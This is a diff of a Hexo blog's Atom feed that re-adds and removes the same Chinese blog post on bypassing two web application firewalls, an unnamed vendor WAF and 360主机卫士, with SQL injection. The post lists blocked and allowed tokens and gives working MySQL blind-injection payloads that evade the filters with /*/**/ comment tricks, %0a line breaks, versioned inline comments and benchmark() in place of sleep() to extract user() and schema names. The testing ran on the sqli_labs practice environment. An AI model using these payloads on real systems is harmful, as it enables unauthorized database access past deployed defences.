@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://e4st.world/"/>
-  <updated>2017-10-13T07:43:39.000Z</updated>
+  <updated>2017-10-13T07:51:24.000Z</updated>
   <id>http://e4st.world/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>两款防火墙的注入绕过姿势</title>
+    <link href="http://e4st.world/2017/09/24/%E4%B8%A4%E6%AC%BEWAF%E7%9A%84%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
+    <id>http://e4st.world/2017/09/24/两款WAF的注入绕过姿势/</id>
+    <published>2017-09-24T12:25:04.000Z</published>
+    <updated>2017-10-13T07:51:24.000Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。</p><hr><h1 id="0x00-某厂商WAF"><a href="#0x00-某厂商WAF" class="headerlink" title="0x00 某厂商WAF"></a>0x00 某厂商WAF</h1><h2 id="拦截语句"><a href="#拦截语句" class="headerlink" title="拦截语句"></a>拦截语句</h2><p>按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：</p><ul><li>and 1=1类型</li><li>‘、%27</li><li>union、select、union select、select from、sleep()</li><li>/*!*/</li><li>…</li></ul><h2 id="放行语句"><a href="#放行语句" class="headerlink" title="放行语句"></a>放行语句</h2><p>在上面尝试中发现如下语句未被拦截：</p><ul><li>order by</li><li>/**/</li><li>/*/**/and if(1,1,0) </li><li>%0a、%0b…</li><li>order by x</li><li>…<blockquote><p>对于第三个payload，最先尝试的是?id=1 and if(1,1,0)，被拦截，然后猜测问题在于and这里，就在前面加了一个/**/进行尝试，发现还是失败，然后在注释中多加了/*，成功绕过，/*/*/也是可行的<br>测试发现，若响应内容含有敏感信息(mysql错误信息)，会被WAF重置连接。所以需要构造一个可以执行成功的sql语句</p></blockquote></li></ul><h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><ol><li>既然敏感信息会被重置连接，我们可以采用盲注的方式进行绕过<br>先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制，验证是否存在注入<br>在安全狗测试中我们是使用内联注释过狗的，但这款WAF限制了内联注释，所以需要另外的方法。并且由于单引号也被禁止了，暂时未想到绕过方法，先尝试数字型注入的绕过<br>测试payload:<code>and 1 --</code>、<code>and 0 --</code><br><img src="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg" alt=""></li><li>接着我们尝试一下<code>and if</code>形式的注入语句：<br><code>/*/**/and if(substr(1,1,1)=1,1,0) -- -</code><br>未拦截，然后修改payload：<br><code>/*/**/and if(substr(user(),1,1)=&#39;r&#39;,1,0) -- -</code>，成功<br><img src="https://i.loli.net/2017/10/13/59e02adbe8a72.png" alt=""></li><li>继续往下构造<br><code>/*/*/and if(substr((select/**/schema_name/*/**/from/**/(information_schema.schemata)limit 1 offset 0/*/**/),1,1)=&#39;i&#39;,1,0)-- -</code> 成功<br>select后面跟的/**/是关键<blockquote><p>ps:上面这段payload之前尝试其实是失败的，写文章复现的时候发现居然能过，一脸懵逼。当时是针对select进行了尝试，使用%0aselect进行的绕过</p></blockquote></li><li><p>这里其实还有个问题，针对sleep()函数的绕过，WAF对这块限制的很严，试过sleep/**/()、sleep/*/**/()等，均尝试失败<br>但是我们可以使用另外一个函数进行替代：benchmark()，最后构造payload如下：<br><code>/*/*/and if(substr(user/*/**/(),1,1)=&#39;r&#39;,benchmark(100000000,rand()),0)-- -</code> </p><blockquote><p>ps:我们这里是针对数字型注入进行的绕过，后来测试了字符型，发现<code>/*/**/&#39;</code>就可以过掉WAF，和上面<code>and if</code>的思路一致。针对union select的绕过，利用上述中的方法也是可以过的。</p></blockquote></li></ol><h1 id="0x01-360主机卫士"><a href="#0x01-360主机卫士" class="headerlink" title="0x01 360主机卫士"></a>0x01 360主机卫士</h1><blockquote><p>ps:官网给出的更新日志是2015年12月，windows版本为：Windows 2.0.4.6</p></blockquote><p>同样，我们继续按照之前的思路来测试</p><h2 id="拦截语句-1"><a href="#拦截语句-1" class="headerlink" title="拦截语句"></a>拦截语句</h2><ul><li>select、select from、union select</li><li>and 1=1类型</li><li>/*!50000*/     #后续测试发现，只拦截了这一个，如/*!500001*/就不会被拦截</li><li>…</li></ul><h2 id="放行语句-1"><a href="#放行语句-1" class="headerlink" title="放行语句"></a>放行语句</h2><ul><li>单独使用的select、union、from</li><li>‘</li><li>/*!*/</li><li>…</li></ul><h2 id="测试思路-1"><a href="#测试思路-1" class="headerlink" title="测试思路"></a>测试思路</h2><ol><li>对于绕<code>and 1=1</code>类似语句方法和安全狗的一样，可以使用<code>and /*!1=1*/</code>或者<code>and /*!1*/=/*!1*/</code>来进行绕过<br>and if(substr(user(),1,1)=’r’,1,0)– -</li><li>进行下一步测试时发现，payload:<code>and if(substr(user(),1,1)=&#39;r&#39;,1,0)-- -</code>未被拦截，可以直接执行<br><img src="https://i.loli.net/2017/10/13/59e05ba34408b.png" alt=""></li><li>然后继续构造payload查询数据库：<code>and if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code>，结果被拦截<br><img src="https://i.loli.net/2017/10/13/59e05c5773da1.png" alt=""><br>因为payload含有<code>select from</code><br>按照第一节中的方法，我们使用%0aselect的形式试图干扰WAF，失败<br>payload:<code>and if(substr((%0aselect schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>接着我们在from前面加上了%0a，还是失败<br>payload:<code>and if(substr((%0aselect schema_name%0afrom information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>然后我尝试了对from使用内联注释，成功<br>payload:<code>and if(substr((%0aselect schema_name%0a/*!50001from*/ information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br><img src="https://i.loli.net/2017/10/13/59e05e4f0c0f2.png" alt=""><br>使用这种方法也可以绕过<code>union select</code>的限制，这里就不多说了<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1>这次测试比之前安全狗测试的时候思路要清晰一些，但感觉还是有诸多不足，对于mysql的特性还需要积累总结。</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&quot;0x00-某厂商WAF&quot;&gt;&lt;a href=&quot;#0x00-某厂商WAF&quot; class=&quot;headerlink&quot; ti
+      
+    
+    </summary>
+    
+    
+      <category term="bypass" scheme="http://e4st.world/tags/bypass/"/>
+    
+  </entry>
   
   <entry>
     <title>打狗棒法-注入过狗姿势</title>
@@ -33,32 +59,6 @@
 &lt;p&gt;前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。目前测试的版本为网站安全狗（apache版）4.0.18089，截止2017/09/25官网最新版&lt;/p&gt;
 &lt;hr&gt;
 
-      
-    
-    </summary>
-    
-    
-      <category term="bypass" scheme="http://e4st.world/tags/bypass/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>两款防火墙的注入绕过姿势</title>
-    <link href="http://e4st.world/2017/09/24/%E4%B8%A4%E6%AC%BEWAF%E7%9A%84%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
-    <id>http://e4st.world/2017/09/24/两款WAF的注入绕过姿势/</id>
-    <published>2017-09-24T12:25:04.000Z</published>
-    <updated>2017-10-13T06:52:34.000Z</updated>
-    
-    <content type="html"><![CDATA[<hr><p>前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。</p><hr><h1 id="0x00-某厂商WAF"><a href="#0x00-某厂商WAF" class="headerlink" title="0x00 某厂商WAF"></a>0x00 某厂商WAF</h1><h2 id="拦截语句"><a href="#拦截语句" class="headerlink" title="拦截语句"></a>拦截语句</h2><p>按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：</p><ul><li>and 1=1类型</li><li>‘、%27</li><li>union、select、union select、select from、sleep()</li><li>/*!*/</li><li>…</li></ul><h2 id="放行语句"><a href="#放行语句" class="headerlink" title="放行语句"></a>放行语句</h2><p>在上面尝试中发现如下语句未被拦截：</p><ul><li>order by</li><li>/**/</li><li>/*/**/and if(1,1,0) </li><li>%0a、%0b…</li><li>order by x</li><li>…<blockquote><p>对于第三个payload，最先尝试的是?id=1 and if(1,1,0)，被拦截，然后猜测问题在于and这里，就在前面加了一个/**/进行尝试，发现还是失败，然后在注释中多加了/*，成功绕过，/*/*/也是可行的<br>测试发现，若响应内容含有敏感信息(mysql错误信息)，会被WAF重置连接。所以需要构造一个可以执行成功的sql语句</p></blockquote></li></ul><h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><ol><li>既然敏感信息会被重置连接，我们可以采用盲注的方式进行绕过<br>先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制，验证是否存在注入<br>在安全狗测试中我们是使用内联注释过狗的，但这款WAF限制了内联注释，所以需要另外的方法。并且由于单引号也被禁止了，暂时未想到绕过方法，先尝试数字型注入的绕过<br>测试payload:<code>and 1 --</code>、<code>and 0 --</code><br><img src="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg" alt=""></li><li>接着我们尝试一下<code>and if</code>形式的注入语句：<br><code>/*/**/and if(substr(1,1,1)=1,1,0) -- -</code><br>未拦截，然后修改payload：<br><code>/*/**/and if(substr(user(),1,1)=&#39;r&#39;,1,0) -- -</code>，成功<br><img src="https://i.loli.net/2017/10/13/59e02adbe8a72.png" alt=""></li><li>继续往下构造<br><code>/*/*/and if(substr((select/**/schema_name/*/**/from/**/(information_schema.schemata)limit 1 offset 0/*/**/),1,1)=&#39;i&#39;,1,0)-- -</code> 成功<br>select后面跟的/**/是关键<blockquote><p>ps:上面这段payload之前尝试其实是失败的，写文章复现的时候发现居然能过，一脸懵逼。当时是针对select进行了尝试，使用%0aselect进行的绕过</p></blockquote></li><li><p>这里其实还有个问题，针对sleep()函数的绕过，WAF对这块限制的很严，试过sleep/**/()、sleep/*/**/()等，均尝试失败<br>但是我们可以使用另外一个函数进行替代：benchmark()，最后构造payload如下：<br><code>/*/*/and if(substr(user/*/**/(),1,1)=&#39;r&#39;,benchmark(100000000,rand()),0)-- -</code> </p><blockquote><p>ps:我们这里是针对数字型注入进行的绕过，后来测试了字符型，发现<code>/*/**/&#39;</code>就可以过掉WAF，和上面<code>and if</code>的思路一致。针对union select的绕过，利用上述中的方法也是可以过的。</p></blockquote></li></ol><h1 id="0x01-360主机卫士"><a href="#0x01-360主机卫士" class="headerlink" title="0x01 360主机卫士"></a>0x01 360主机卫士</h1><blockquote><p>ps:官网给出的更新日志是2015年12月，windows版本为：Windows 2.0.4.6</p></blockquote><p>同样，我们继续按照之前的思路来测试</p><h2 id="拦截语句-1"><a href="#拦截语句-1" class="headerlink" title="拦截语句"></a>拦截语句</h2><ul><li>select、select from、union select</li><li>and 1=1类型</li><li>/*!50000*/     #后续测试发现，只拦截了这一个，如/*!500001*/就不会被拦截</li><li>…</li></ul><h2 id="放行语句-1"><a href="#放行语句-1" class="headerlink" title="放行语句"></a>放行语句</h2><ul><li>单独使用的select、union、from</li><li>‘</li><li>/*!*/</li><li>…</li></ul><h2 id="测试思路-1"><a href="#测试思路-1" class="headerlink" title="测试思路"></a>测试思路</h2><ol><li>对于绕<code>and 1=1</code>类似语句方法和安全狗的一样，可以使用<code>and /*!1=1*/</code>或者<code>and /*!1*/=/*!1*/</code>来进行绕过<br>and if(substr(user(),1,1)=’r’,1,0)– -</li><li>进行下一步测试时发现，payload:<code>and if(substr(user(),1,1)=&#39;r&#39;,1,0)-- -</code>未被拦截，可以直接执行<br><img src="https://i.loli.net/2017/10/13/59e05ba34408b.png" alt=""></li><li>然后继续构造payload查询数据库：<code>and if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code>，结果被拦截<br><img src="https://i.loli.net/2017/10/13/59e05c5773da1.png" alt=""><br>因为payload含有<code>select from</code><br>按照第一节中的方法，我们使用%0aselect的形式试图干扰WAF，失败<br>payload:<code>and if(substr((%0aselect schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>接着我们在from前面加上了%0a，还是失败<br>payload:<code>and if(substr((%0aselect schema_name%0afrom information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>然后我尝试了对from使用内联注释，成功<br>payload:<code>and if(substr((%0aselect schema_name%0a/*!50001from*/ information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br><img src="https://i.loli.net/2017/10/13/59e05e4f0c0f2.png" alt=""><br>使用这种方法也可以绕过<code>union select</code>的限制，这里就不多说了<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1>这次测试比之前安全狗测试的时候思路要清晰一些，但感觉还是有诸多不足，对于mysql的特性还需要积累总结。</li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;hr&gt;
-&lt;p&gt;前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&quot;0x00-某厂商WAF&quot;&gt;&lt;a href=&quot;#0x00-某厂商WAF&quot; class=&quot;headerlink&quot; ti
       
     
     </summary>
